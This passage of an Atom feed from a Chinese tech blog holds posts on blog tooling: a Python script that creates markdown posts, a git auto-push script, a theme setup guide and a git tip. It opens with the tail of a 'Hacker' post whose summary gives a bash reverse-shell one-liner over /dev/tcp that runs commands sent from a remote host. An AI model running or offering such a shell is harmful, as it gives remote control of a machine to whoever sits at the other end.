&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;exec&lt;/span&gt; 5&amp;lt;&amp;gt;/dev/tcp/192.168.1.142/80&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;cat &amp;lt;&amp;amp;5 | &lt;span class=&quot;keyword&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;built_in&quot;&gt;read&lt;/span&gt; line; &lt;span class=&quot;keyword&quot;&gt;do&lt;/span&gt; &lt;span class=&quot;variable&quot;&gt;$line&lt;/span&gt; 2&amp;gt;&amp;amp;5 &amp;gt;&amp;amp;5; &lt;span class=&quot;keyword&quot;&gt;done&lt;/span&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# or:&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;built_in&quot;&gt;read&lt;/span&gt; line 0&amp;lt;&amp;amp;5; &lt;span class=&quot;keyword&quot;&gt;do&lt;/span&gt; &lt;span class=&quot;variable&quot;&gt;$line&lt;/span&gt; 2&amp;gt;&amp;amp;5 &amp;gt;&amp;amp;5; &lt;span class=&quot;keyword&quot;&gt;done&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
      <category term="Hacker" scheme="http://hacktech.cn/categories/Hacker/"/>
    
    
      <category term="Hacker" scheme="http://hacktech.cn/tags/Hacker/"/>
    
  </entry>
  
  <entry>
    <title>为纸小墨一键创建md文件</title>
    <link href="http://hacktech.cn/2018/08/22/ink-create-md.html"/>
    <id>http://hacktech.cn/2018/08/22/ink-create-md.html</id>
    <published>2018-08-22T10:17:23.000Z</published>
    <updated>2019-11-13T05:11:10.976Z</updated>
    
    <content type="html"><![CDATA[<p>用法：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python the.py file_name [article_title] [author_id]</span><br><span class="line"><span class="comment"># []括起来为可选项</span></span><br></pre></td></tr></table></figure><a id="more"></a><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    file_name = <span class="string">''</span></span><br><span class="line">    post_title = <span class="string">''</span></span><br><span class="line">    author = <span class="string">'me'</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) == <span class="number">2</span>:</span><br><span class="line">        file_name = str(sys.argv[<span class="number">1</span>])</span><br><span class="line">        post_title = str(sys.argv[<span class="number">1</span>])</span><br><span class="line">    <span class="keyword">elif</span> len(sys.argv) == <span class="number">3</span>:</span><br><span class="line">        file_name = str(sys.argv[<span class="number">1</span>])</span><br><span class="line">        post_title = str(sys.argv[<span class="number">2</span>])</span><br><span class="line">    <span class="keyword">elif</span> len(sys.argv) == <span class="number">4</span>:</span><br><span class="line">        file_name = str(sys.argv[<span class="number">1</span>])</span><br><span class="line">        post_title = str(sys.argv[<span class="number">2</span>])</span><br><span class="line">        author = str(sys.argv[<span class="number">3</span>])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">"Usage: \n\t%s file_name [article_title] [author_id]"</span> % sys.argv[<span class="number">0</span>])</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">'./blog/source/%s.md'</span> % file_name, <span class="string">'w'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(<span class="string">'title: %s\n'</span> % post_title)</span><br><span class="line">        f.write(<span class="string">'date: %s\n'</span> % time.strftime(<span class="string">"%Y-%m-%d %H:%M:%S"</span>, time.localtime()))</span><br><span class="line">        f.write(<span class="string">'update: ""\n'</span>)</span><br><span class="line">        f.write(<span class="string">'author: %s\n'</span> % author)</span><br><span class="line">        f.write(<span class="string">'tags: \n'</span>)</span><br><span class="line">        f.write(<span class="string">'- \n'</span>)</span><br><span class="line">        f.write(<span class="string">'categories: \n'</span>)</span><br><span class="line">        f.write(<span class="string">'- \n'</span>)</span><br><span class="line">        f.write(<span class="string">'topic: ""\n'</span>)</span><br><span class="line">        f.write(<span class="string">'cover: ""\n'</span>)</span><br><span class="line">        f.write(<span class="string">'draft: false\n'</span>)</span><br><span class="line">        f.write(<span class="string">'preview: ""\n'</span>)</span><br><span class="line">        f.write(<span class="string">'top: false\n'</span>)</span><br><span class="line">        f.write(<span class="string">'type: ""\n'</span>)</span><br><span class="line">        f.write(<span class="string">'hide: false\n'</span>)</span><br><span class="line">        f.write(<span class="string">'config: null\n'</span>)</span><br><span class="line">        f.write(<span class="string">'\n\n---\n\n\n\n'</span>)</span><br><span class="line">    print(<span class="string">'Create %s.md Finished'</span> % file_name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;用法：&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;python the.py file_name [article_title] [author_id]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# []括起来为可选项&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
      <category term="Python" scheme="http://hacktech.cn/categories/Python/"/>
    
    
      <category term="Python" scheme="http://hacktech.cn/tags/Python/"/>
    
      <category term="Tools" scheme="http://hacktech.cn/tags/Tools/"/>
    
  </entry>
  
  <entry>
    <title>一键git push脚本(python版)</title>
    <link href="http://hacktech.cn/2018/08/22/git-push-python-script.html"/>
    <id>http://hacktech.cn/2018/08/22/git-push-python-script.html</id>
    <published>2018-08-22T09:34:24.000Z</published>
    <updated>2019-11-13T05:11:10.976Z</updated>
    
    <content type="html"><![CDATA[<p>有时候感觉项目push上去每次都敲那么几个命令挺烦人的，可以用这个脚本来代替手工</p><a id="more"></a><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">gitconfig = &#123;</span><br><span class="line">    <span class="string">'cwd'</span>: <span class="string">'./blog/public'</span>,</span><br><span class="line">    <span class="string">'git'</span>: &#123;</span><br><span class="line">        <span class="string">'github'</span>: [<span class="string">'git@github.com:akkuman/akkuman.github.io.git'</span>, <span class="string">'master'</span>],</span><br><span class="line">        <span class="string">'coding'</span>: [<span class="string">'git@git.coding.net:Akkuman/Akkuman.git'</span>, <span class="string">'coding-pages'</span>],</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">global</span> gitconfig</span><br><span class="line"></span><br><span class="line">    <span class="comment"># change working directory</span></span><br><span class="line">    os.chdir(gitconfig.get(<span class="string">'cwd'</span>, <span class="string">'.'</span>))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># check if git init</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">'.git'</span> <span class="keyword">not</span> <span class="keyword">in</span> os.listdir():</span><br><span class="line">        subprocess.check_call([<span class="string">'git'</span>, <span class="string">'init'</span>])</span><br><span class="line"></span><br><span class="line">    <span class="comment"># check if remote in config, if not, add the remote</span></span><br><span class="line">    git_remotes = subprocess.check_output([<span class="string">'git'</span>, <span class="string">'remote'</span>, <span class="string">'-v'</span>])</span><br><span class="line">    git_remotes_str = bytes.decode(git_remotes).strip()</span><br><span class="line">    git_remotes_list = [line.split()[<span class="number">0</span>] <span class="keyword">for</span> line <span class="keyword">in</span> git_remotes_str.split(<span class="string">'\n'</span>)]</span><br><span class="line">    <span class="keyword">for</span> k,v <span class="keyword">in</span> gitconfig[<span class="string">'git'</span>].items():</span><br><span class="line">        <span class="keyword">if</span> k <span class="keyword">not</span> <span class="keyword">in</span> git_remotes_list:</span><br><span class="line">            subprocess.check_call([<span class="string">'git'</span>, <span class="string">'remote'</span>, <span class="string">'add'</span>, k, v[<span class="number">0</span>]])</span><br><span class="line"></span><br><span class="line">    <span class="comment"># add . &amp; commit with message</span></span><br><span class="line">    subprocess.check_call([<span class="string">'git'</span>, <span class="string">'add'</span>, <span class="string">'.'</span>])</span><br><span class="line">    commit_message = <span class="string">'Site updated: %s'</span> % time.strftime(<span class="string">"%Y-%m-%d %H:%M:%S"</span>, time.localtime())</span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) == <span class="number">2</span>:</span><br><span class="line">        commit_message = sys.argv[<span class="number">1</span>]</span><br><span class="line">    subprocess.call([<span class="string">'git'</span>, <span class="string">'commit'</span>, <span class="string">'-m'</span>, commit_message])</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># push to every remote repo</span></span><br><span class="line">    <span class="keyword">for</span> k,v <span class="keyword">in</span> gitconfig[<span class="string">'git'</span>].items():</span><br><span class="line">        subprocess.check_call([<span class="string">'git'</span>, <span class="string">'push'</span>, k, <span class="string">'master:%s'</span> % v[<span class="number">1</span>]])</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) == <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">if</span> sys.argv[<span class="number">1</span>] == <span class="string">'-h'</span>:</span><br><span class="line">            print(<span class="string">'Usage:\n\t%s [commit_message]'</span> % sys.argv[<span class="number">0</span>])</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;有时候感觉项目push上去每次都敲那么几个命令挺烦人的，可以用这个脚本来代替手工&lt;/p&gt;
    
    </summary>
    
      <category term="git" scheme="http://hacktech.cn/categories/git/"/>
    
    
      <category term="Python" scheme="http://hacktech.cn/tags/Python/"/>
    
      <category term="Tools" scheme="http://hacktech.cn/tags/Tools/"/>
    
      <category term="git" scheme="http://hacktech.cn/tags/git/"/>
    
  </entry>
  
  <entry>
    <title>纸小墨ink简洁主题story爱上你的故事</title>
    <link href="http://hacktech.cn/2018/08/22/ink-theme-story.html"/>
    <id>http://hacktech.cn/2018/08/22/ink-theme-story.html</id>
    <published>2018-08-22T07:36:42.000Z</published>
    <updated>2019-11-13T05:11:10.976Z</updated>
    
    <content type="html"><![CDATA[<h2 id="主题介绍"><a href="#主题介绍" class="headerlink" title="主题介绍"></a>主题介绍</h2><p>为纸小墨写的一款主题,该主题移植自<a href="https://yumoe.com" target="_blank" rel="noopener">Yumoe</a><br><!--和[Artifact.](https://artifact.me/)--></p><p>github地址：<a href="https://github.com/akkuman/ink-theme-story" target="_blank" rel="noopener">ink-theme-story</a></p><h3 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h3><p><a href="https://ink-theme-story.pancakeapps.com" target="_blank" rel="noopener">ink-theme-story</a></p><a id="more"></a><h3 id="主题的一些食用说明"><a href="#主题的一些食用说明" class="headerlink" title="主题的一些食用说明"></a>主题的一些食用说明</h3><h4 id="菜单"><a href="#菜单" class="headerlink" title="菜单"></a>菜单</h4><p>标题旁边有一个 · 字符，点击后便可显示菜单。<strong>1</strong>,<strong>2</strong>,<strong>3</strong> 分别代表 <strong>独立页面菜单</strong>、<strong>导航树</strong>(仅在文章界面有用)以及<strong>搜索框</strong>。</p><h3 id="一些功能"><a href="#一些功能" class="headerlink" title="一些功能"></a>一些功能</h3><ul><li>评论点击加载, 可以应对一些墙导致无法加载的场景</li><li>图片懒加载</li><li>评论系统支持来必力, Disqus, Gitment, 默认为Disqus</li><li>…</li></ul><h2 id="主题截图"><a href="#主题截图" class="headerlink" title="主题截图"></a>主题截图</h2><p><img src="https://i.loli.net/2018/08/20/5b7a62b4ce584.png" alt="Screenshot_20180820_143859.png"></p><h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><h3 id="基础设置"><a href="#基础设置" class="headerlink" title="基础设置"></a>基础设置</h3><p>进入到纸小墨程序的目录下, 也就是ink主程序的目录, 然后进入该目录下的blog目录</p><p>然后执行<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/akkuman/ink-theme-story.git</span><br></pre></td></tr></table></figure></p><p>或者下载git压缩包后解压到blog文件夹</p><p>现在你可以看到blog目录下的ink-theme-story目录</p><p>然后修改站点配置文件<code>blog/config.yml</code></p><p>站点配置文件一般如下: </p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">site:</span></span><br><span class="line"><span class="attr">    title:</span> <span class="string">"Akkuman"</span></span><br><span class="line"><span class="attr">    subtitle:</span> <span class="string">"Akkuman的技术博客"</span></span><br><span class="line"><span class="attr">    limit:</span> <span class="number">8</span></span><br><span class="line"><span class="attr">    theme:</span> <span class="string">ink-theme-story</span></span><br><span class="line"><span class="attr">    lang:</span> <span class="string">zh</span></span><br><span class="line"><span class="attr">    url:</span> <span class="string">"ink-theme-story.pancakeapps.com"</span></span><br><span class="line"><span class="attr">    comment:</span> <span class="string">Akkuman</span></span><br><span class="line"><span class="attr">    logo:</span> <span class="string">"-/images/avatar.png"</span></span><br><span class="line">    <span class="comment"># link: "&#123;category&#125;/&#123;year&#125;/&#123;month&#125;/&#123;day&#125;/&#123;title&#125;.html"</span></span><br><span class="line"><span class="attr">    link:</span> <span class="string">"&#123;year&#125;/&#123;month&#125;/&#123;day&#125;/&#123;title&#125;.html"</span></span><br><span class="line">    <span class="comment"># root: "/blog"</span></span><br><span class="line"></span><br><span class="line"><span class="attr">authors:</span></span><br><span class="line"><span class="attr">    me:</span></span><br><span class="line"><span class="attr">        name:</span> <span class="string">"Akkuman"</span></span><br><span class="line"><span class="attr">        intro:</span> <span class="string">"编程小白|技术菜鸟"</span></span><br><span class="line"><span class="attr">        avatar:</span> <span class="string">"-/images/avatar.png"</span></span><br><span class="line"></span><br><span class="line"><span class="attr">build:</span></span><br><span class="line">    <span class="comment"># output: "public"</span></span><br><span class="line"><span class="attr">    port:</span> <span class="number">8000</span></span><br><span class="line">    <span class="comment"># Copied files to public folder when build</span></span><br><span class="line"><span class="attr">    copy:</span></span><br><span class="line"><span class="bullet">        -</span> <span class="string">"source/images"</span></span><br><span class="line">    <span class="comment"># Excuted command when use 'ink publish'</span></span><br><span class="line"><span class="attr">    publish:</span> <span class="string">|</span></span><br><span class="line"><span class="string">        git add . -A</span></span><br><span class="line"><span class="string">        git commit -m "update"</span></span><br><span class="line"><span class="string">        git push origin</span></span><br></pre></td></tr></table></figure><p>我们需要<strong>修改</strong>的地方有:<br><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">title</span>   <span class="comment">#title字段是截图中的左上角Akkuman字段, 比如我设置为Akkuman那么就是和我截图中一样</span></span><br><span class="line"><span class="string">subtitle</span>    <span class="comment">#网站子标题, 在标签页和归档能看到</span></span><br><span class="line"><span class="attr">limit:</span> <span class="number">8</span>    <span class="comment">#每页可显示的文章数目, 为了美观建议设置为8</span></span><br><span class="line"><span class="attr">theme:</span> <span class="string">ink-theme-story</span>    <span class="comment">#网站主题目录, 设置为该主题ink-theme-story</span></span><br></pre></td></tr></table></figure></p><p>其他地方根据自己需求更改, 纸小墨说明文档见<a href="http://www.chole.io/blog/ink-blog-tool.html" target="_blank" rel="noopener">简洁的静态博客构建工具 —— 纸小墨（InkPaper）</a></p><h3 id="关于页面"><a href="#关于页面" class="headerlink" title="关于页面"></a>关于页面</h3><p>在纸小墨中,每篇文章是有作者的,我现在按上面我给出的例子配置为例进行说明</p><p>纸小墨中每一篇文章的头配置大致如下: </p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">title:</span> <span class="string">"简洁的静态博客构建工具 —— 纸小墨（InkPaper）"</span></span><br><span class="line"><span class="attr">date:</span> <span class="number">2015</span><span class="bullet">-03</span><span class="bullet">-01</span> <span class="number">18</span><span class="string">:00:00</span> <span class="string">+0800</span></span><br><span class="line"><span class="attr">update:</span> <span class="number">2016</span><span class="bullet">-07</span><span class="bullet">-11</span> <span class="number">17</span><span class="string">:00:00</span> <span class="string">+0800</span></span><br><span class="line"><span class="attr">author:</span> <span class="string">me</span></span><br><span class="line"><span class="attr">cover:</span> <span class="string">"-/images/example.png"</span></span><br><span class="line"><span class="attr">tags:</span></span><br><span class="line"><span class="bullet">    -</span> <span class="string">设计</span></span><br><span class="line"><span class="bullet">    -</span> <span class="string">写作</span></span><br><span class="line"><span class="attr">preview:</span> <span class="string">纸小墨（InkPaper）是一个GO语言编写的开源静态博客构建工具，可以快速搭建博客网站。它无依赖跨平台，配置简单构建快速，注重简洁易用与更优雅的排版。</span></span><br></pre></td></tr></table></figure><p>其中的<code>preview</code>是文章预览，也可在正文中使用<code>&lt;!--more--&gt;</code>分割, 是一个可选字段,我们不必管</p><p>对我们有影响的字段配置除了基础的<code>title</code>等等之外, 需要关注一下<code>author</code>这个字段</p><p>纸小墨每一篇文章的作者的关于页面是</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">about.&#123;&#123;.Author.Id&#125;&#125;.html</span><br></pre></td></tr></table></figure><p>比如我上面的站点配置文件中<code>authors</code>有一个值是<code>me</code>, 那么这个作者的关于页面就是<code>about.me.html</code>, 也就是我们需要建立一个page, 纸小墨主程序打包中有一个文件<code>about.me.md</code>, 可以参见这个文件的格式, 我在这里给出来: </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">type: page</span><br><span class="line">title: &quot;关于作者&quot;</span><br><span class="line">author: me</span><br><span class="line"></span><br><span class="line">---</span><br><span class="line"></span><br><span class="line">## 纸小墨</span><br><span class="line"></span><br><span class="line">构建只为纯粹书写的博客。</span><br><span class="line"></span><br><span class="line">[http://www.chole.io/](http://www.chole.io/)</span><br></pre></td></tr></table></figure><p>那么这个文件生成后就会在站点根目录下生成<code>about.me.html</code>文件.</p><p><strong>重点来了</strong></p><p>上面我说的关于页面是单个作者的关于页面, 在这个主题中, 我有定义一个站点的关于页面</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"&#123;&#123;.Site.Root&#125;&#125;/about.html"</span>&gt;</span><span class="tag">&lt;<span class="name">li</span>&gt;</span>&#123;&#123;i18n "about"&#125;&#125;<span class="tag">&lt;/<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><p>我们只需要按照上面<code>about.me.md</code>的格式新建一个<code>about.md</code>即可, 我在这里给出一个<code>about.md</code>例子: </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">type: page</span><br><span class="line">title: &quot;关于本站&quot;</span><br><span class="line"></span><br><span class="line">---</span><br><span class="line"></span><br><span class="line">我是一个站点关于页面例子</span><br></pre></td></tr></table></figure><p><code>author</code>字段可省略,看自己的喜好</p><h3 id="评论系统切换"><a href="#评论系统切换" class="headerlink" title="评论系统切换"></a>评论系统切换</h3><p>本主题的评论采用点击再动态加载的方式, 所以不用担心因为Disqus被墙的原因导致页面打不开, 只有当你点击<code>show comments</code>时才会开始加载评论</p><p>本主题的评论系统支持来必力, Disqus, Gitment</p><h4 id="来必力Livere"><a href="#来必力Livere" class="headerlink" title="来必力Livere"></a>来必力Livere</h4><p>切换为来必力的话只需要修改站点配置文件<code>blog/config.yml</code>, 把<code>comment</code>字段的值修改成来必力的<code>data-uid</code>(<em>可在来必力后台代码管理中看到</em>), 然后打开<code>blog/ink-theme-story/_comment.html</code>文件, 把来必力评论的注释去掉, 然后把Disqus评论加上注释即可</p><h4 id="Gitment"><a href="#Gitment" class="headerlink" title="Gitment"></a>Gitment</h4><p>切换为Gitment的话同上修改, <code>comment</code>字段的格式为</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">comment:</span> <span class="string">"owner:repo:client_id:client_secret"</span></span><br></pre></td></tr></table></figure><p>其中各个的属性为</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">owner</span>           <span class="comment">#你的 GitHub ID</span></span><br><span class="line"><span class="string">repo</span>            <span class="comment">#存储评论的 repo</span></span><br><span class="line"><span class="string">client_id</span>       <span class="comment">#你的 client ID</span></span><br><span class="line"><span class="string">client_secret</span>   <span class="comment">#你的 client secret</span></span><br></pre></td></tr></table></figure><p>然后打开<code>blog/ink-theme-story/_comment.html</code>文件, 把Gitment评论的注释去掉, 然后把Disqus评论加上注释即可</p><h2 id="写在最后"><a href="#写在最后" class="headerlink" title="写在最后"></a>写在最后</h2><h3 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h3><p>特别感谢<a href="https://yumoe.com" target="_blank" rel="noopener">Yumoe</a>提供了这么简洁大方的主题</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;主题介绍&quot;&gt;&lt;a href=&quot;#主题介绍&quot; class=&quot;headerlink&quot; title=&quot;主题介绍&quot;&gt;&lt;/a&gt;主题介绍&lt;/h2&gt;&lt;p&gt;为纸小墨写的一款主题,该主题移植自&lt;a href=&quot;https://yumoe.com&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Yumoe&lt;/a&gt;&lt;br&gt;&lt;!--和[Artifact.](https://artifact.me/)--&gt;&lt;/p&gt;
&lt;p&gt;github地址：&lt;a href=&quot;https://github.com/akkuman/ink-theme-story&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;ink-theme-story&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;Demo&quot;&gt;&lt;a href=&quot;#Demo&quot; class=&quot;headerlink&quot; title=&quot;Demo&quot;&gt;&lt;/a&gt;Demo&lt;/h3&gt;&lt;p&gt;&lt;a href=&quot;https://ink-theme-story.pancakeapps.com&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;ink-theme-story&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="theme" scheme="http://hacktech.cn/categories/theme/"/>
    
    
      <category term="theme" scheme="http://hacktech.cn/tags/theme/"/>
    
  </entry>
  
  <entry>
    <title>git忽略对已入库文件的修改</title>
    <link href="http://hacktech.cn/2018/08/22/git-update-index.html"/>
    <id>http://hacktech.cn/2018/08/22/git-update-index.html</id>
    <published>2018-08-22T07:18:42.000Z</published>
    <updated>2019-11-13T05:11:10.976Z</updated>
    
    <content type="html"><![CDATA[<p>项目开发过程中，会遇到本地配置文件每个开发人员不同的情况，但如果遇到类似数据库配置这种最终需要加入 git 版本控制的配置，则会陷入两难境地。要么不跟踪，要么有人提交后其他人同步下来必须手动修改，非常麻烦。其实，对于已被纳入版本管理的文件，git 也提供了很好的解决办法。</p><a id="more"></a><ul><li><p>告诉git<strong>忽略</strong>对已经纳入版本管理的文件 <code>.classpath</code> 的修改，git 会一直忽略此文件直到重新告诉 git 可以再次跟踪此文件 <code>$ git update-index --assume-unchanged .classpath</code></p></li><li><p>告诉 git <strong>恢复跟踪</strong> <code>$ git update-index --assume-unchanged .classpath</code></p></li><li><p><strong>查看</strong>当前被忽略的、已经纳入版本库管理的文件：<code>$ git ls-files -v | grep -e &quot;^[hsmrck]&quot;</code></p></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;项目开发过程中，会遇到本地配置文件每个开发人员不同的情况，但如果遇到类似数据库配置这种最终需要加入 git 版本控制的配置，则会陷入两难境地。要么不跟踪，要么有人提交后其他人同步下来必须手动修改，非常麻烦。其实，对于已被纳入版本管理的文件，git 也提供了很好的解决办法。&lt;/p&gt;
    
    </summary>
    
      <category term="git" scheme="http://hacktech.cn/categories/git/"/>
    
    
      <category term="git" scheme="http://hacktech.cn/tags/git/"/>
    
  </entry>
  
</feed>
